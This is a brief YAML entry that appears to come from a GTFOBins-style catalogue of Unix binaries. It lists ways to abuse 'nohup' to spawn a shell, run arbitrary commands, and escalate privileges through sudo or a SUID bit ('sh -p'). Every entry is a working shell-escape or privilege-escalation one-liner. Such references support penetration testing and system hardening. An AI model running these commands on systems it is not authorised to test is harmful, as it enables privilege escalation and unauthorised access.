---
functions:
  shell:
    - code: nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"
  command:
    - code: |
        COMMAND='/usr/bin/id'
        nohup "$COMMAND"
        cat nohup.out
  sudo:
    - code: sudo nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"
  suid:
    - code: sudo nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
---
